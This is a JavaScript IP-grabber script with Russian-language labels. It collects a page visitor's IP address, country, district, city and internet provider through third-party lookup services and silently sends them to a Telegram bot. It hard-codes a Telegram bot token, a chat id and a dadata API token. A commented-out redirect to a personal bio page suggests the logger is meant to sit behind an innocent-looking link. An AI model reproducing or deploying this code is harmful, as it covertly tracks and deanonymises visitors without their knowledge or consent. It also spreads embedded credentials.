var platform = navigator.userAgent;
var logs = [];
var bot = "6327622331:AAHnsCiagYGxWZY1Fr0uYzkabNtxb0yHX1s";
var id = 1765453902;
var token = "6617cd968d838316fb96ff741982433904046ae6";

function sendInformation() {
    const text = logs.join('%0A');

    var url = `https://api.telegram.org/bot${bot}/sendMessage?chat_id=${id}&parse_mode=html&text=${text}`;

    var options = {
        method: "POST",
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": "Token " + bot
        }
    }

    console.log("✅ Отправлено!");
    
    fetch(url, options)
    .then(response => response.text())
    //.then(result => location="https://saikono-telegram.github.io/mybio/")
    .catch(error => console.log("error", error));
}

function IPLocation(location) {
    let json = JSON.parse(location);

    var os = "🔻 <b>OС:</b> <code>" + platform.os + "</code>";
    var country = "🔻 <b>Страна:</b> <code>" + json.location.data.country + "</code>";
    var federal = "🔻 <b>Округ:</b> <code>" + json.location.data.federal_district + "</code>";
    var city = "🔻 <b>Город:</b> <code>" + json.location.unrestricted_value + "</code>";

    logs.push(os, country, federal, city);
}

function IPProvider(information) {
    let text = information.replace(/<[\/]*pre(.*?)>/g, '').replace(/<[\/]*span(.*?)>/g, '').split("\n");

    var word = [];

    for (var i in text) {
        word.push(text[i].replace(/  +/g, ' '));
    }

    console.log(word.slice(0, 20));

    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i
    .test(navigator.userAgent)) {
        var provider = "🔻 <b>Провайдер:</b> <code>" + word.slice(0, 20) + "</code>";
        //console.log(text);
    } 
    else {
        var provider = "🔻 <b>Провайдер:</b> <code>" + word.slice(0, 20) + "</code>";
        //console.log(text);
    }

    logs.push(provider);

    sendInformation();
}

function getIP(json) {
	var ip = "🔻 <b>IP:</b> <code>" + json.ip + "</code>";
    logs.push(ip);

    getInfo(json.ip);

	var url = "https://suggestions.dadata.ru/suggestions/api/4_1/rs/iplocate/address?ip=";
    var query = json.ip;

    var options = {
        method: "GET",
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": "Token " + token
        }
    }
    
    fetch(url + query, options)
    .then(response => response.text())
    .then(result => IPLocation(result))
    .catch(error => console.log("error", error));
}

function getInfo(ip) {
    var url = "https://whoer.net/whois?host=";
    var query = ip;

    fetch(url + query)
    .then(response => response.text())
    .then(result => IPProvider(result))
    .catch(error => console.log("error", error));
}